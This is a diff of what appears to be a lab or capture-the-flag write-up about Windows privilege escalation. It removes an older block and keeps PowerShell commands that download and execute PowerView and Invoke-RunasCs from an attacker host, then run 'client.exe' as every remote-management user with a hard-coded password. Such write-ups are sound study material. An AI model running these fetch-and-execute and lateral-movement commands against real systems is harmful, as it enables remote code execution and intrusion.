@@ -802,11 +802,6 @@ RegisteredUser : Windows User
 We can try to login as other users that we own via **runascs**
 
 ```bash
-*Evil-WinRM* PS C:\Users\bb.morgan\Documents> iex (new-object net.webclient).DownloadString('http://10.10.14.59:80/Empire/situational_awareness/network/powerview.ps1'); iex (new-object net.webclient).DownloadString('http://10.10.14.59:80/Invoke-RunasCs.ps1')
-*Evil-WinRM* PS C:\Users\bb.morgan\Documents> iex (new-object net.webclient).DownloadString('http://10.10.14.59:80/Invoke-RunasCs.ps1')
-```
-
-```bash
 PS C:\Users\bb.morgan\Documents> iex (new-object net.webclient).DownloadString('http://10.10.14.106:80/Empire/situational_awareness/network/powerview.ps1'); iex (new-object net.webclient).DownloadString('http://10.10.14.106:80/Invoke-RunasCs.ps1')
 PS C:\Users\bb.morgan\Documents> (Get-NetGroupMember -Recurse "remote management users" | ? MemberObjectClass -eq user).MemberName | % { echo "[*] $_"; Invoke-RunasCs -Username "$_" -Password "Bravosec1337!" -
 Command "C:\programdata\client.exe" }
